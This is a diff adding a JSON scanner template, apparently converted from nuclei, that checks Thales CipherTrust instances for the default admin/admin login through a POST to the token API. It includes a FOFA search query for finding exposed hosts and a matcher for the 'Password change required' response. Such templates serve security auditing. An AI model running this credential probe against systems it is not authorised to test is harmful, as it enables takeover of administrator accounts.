@@ -1,0 +1,133 @@
+{
+  "id": "ciphertrust-default-login",
+  "name": "Ciphertrust - Default Login",
+  "author": "SleepingBag945",
+  "severity": "HIGH",
+  "description": "Attackers can control the entire platform through the default password （initpass） vulnerability, and use administrator privileges to operate core functions.\n",
+  "references": [
+    "https://www.thalesdocs.com/ctp/cm/2.6/get_started/deployment/initial-password/index.html#:~:text\u003dThe%20username%20of%20the%20initial,to%20%22admin%22%20in%20lowercase."
+  ],
+  "tags": [
+    "default-login",
+    "ciphertrust"
+  ],
+  "protocol": "http",
+  "selfContained": false,
+  "searchQueries": {
+    "fofa": "cert\u003d\"Ciphertrust\" || fid\u003d\"yHV5+ZZGMu0\u003d\""
+  },
+  "variables": {
+    "password": [
+      "admin"
+    ],
+    "username": [
+      "admin"
+    ]
+  },
+  "variablesType": "pitchfork",
+  "verifySteps": [
+    {
+      "stepId": "http_0",
+      "headers": {},
+      "followRedirect": false,
+      "timeout": 0,
+      "readSize": 0,
+      "raw": [
+        "POST /api/v1/auth/tokens/  HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/json\n\n{\"username\":\"{{username}}\",\"connection\":\"local_account\",\"password\":\"{{password}}\",\"grant_type\":\"password\",\"refresh_token_revoke_unused_in\":30,\"cookies\":true,\"labels\":[\"web-ui\"]}\n"
+      ],
+      "unsafe": false,
+      "disableCookie": false,
+      "disablePathAutomerge": false,
+      "cache": false,
+      "compressed": false,
+      "chunked": false,
+      "matchers": [
+        {
+          "type": "DSL",
+          "values": [
+            "status_code_1 \u003d\u003d 401",
+            "contains(body_1,\"code\") \u0026\u0026 contains(body_1,\"message\\\":\\\"Password change required\")"
+          ],
+          "negative": false,
+          "condition": "AND",
+          "index": 0,
+          "caseInsensitive": false,
+          "greedy": false,
+          "group": 0
+        }
+      ],
+      "matchersCondition": "OR",
+      "extractors": [],
+      "output": {},
+      "retries": 0,
+      "retryInterval": 0
+    }
+  ],
+  "exploitSteps": [],
+  "globalConfig": {
+    "maxRetries": 0,
+    "retryInterval": 0,
+    "globalHeaders": {},
+    "stopAtFirstMatch": false,
+    "threads": 0,
+    "cookieReuse": false,
+    "dnsConfig": {},
+    "authConfig": {}
+  },
+  "originalPoc": {
+    "id": "ciphertrust-default-login",
+    "info": {
+      "name": "Ciphertrust - Default Login",
+      "author": "SleepingBag945",
+      "severity": "high",
+      "description": "Attackers can control the entire platform through the default password （initpass） vulnerability, and use administrator privileges to operate core functions.\n",
+      "reference": [
+        "https://www.thalesdocs.com/ctp/cm/2.6/get_started/deployment/initial-password/index.html#:~:text\u003dThe%20username%20of%20the%20initial,to%20%22admin%22%20in%20lowercase."
+      ],
+      "metadata": {
+        "max_request": 1,
+        "fofa_query": "cert\u003d\"Ciphertrust\" || fid\u003d\"yHV5+ZZGMu0\u003d\""
+      },
+      "tags": "default-login,ciphertrust"
+    },
+    "self_contained": false,
+    "http": [
+      {
+        "global_matchers": false,
+        "payloads": {
+          "username": [
+            "admin"
+          ],
+          "password": [
+            "admin"
+          ]
+        },
+        "attack": "pitchfork",
+        "cookie_reuse": false,
+        "disable_cookie": false,
+        "disable_path_automerge": false,
+        "threads": 0,
+        "redirects": false,
+        "skip_variables_check": false,
+        "stop_at_first_match": false,
+        "unsafe": false,
+        "read_all": false,
+        "iterate_all": false,
+        "raw": [
+          "POST /api/v1/auth/tokens/  HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/json\n\n{\"username\":\"{{username}}\",\"connection\":\"local_account\",\"password\":\"{{password}}\",\"grant_type\":\"password\",\"refresh_token_revoke_unused_in\":30,\"cookies\":true,\"labels\":[\"web-ui\"]}\n"
+        ],
+        "matchers": [
+          {
+            "type": "dsl",
+            "dsl": [
+              "status_code_1 \u003d\u003d 401",
+              "contains(body_1,\"code\") \u0026\u0026 contains(body_1,\"message\\\":\\\"Password change required\")"
+            ],
+            "condition": "and"
+          }
+        ]
+      }
+    ]
+  },
+  "originalFormat": "nuclei"
+}
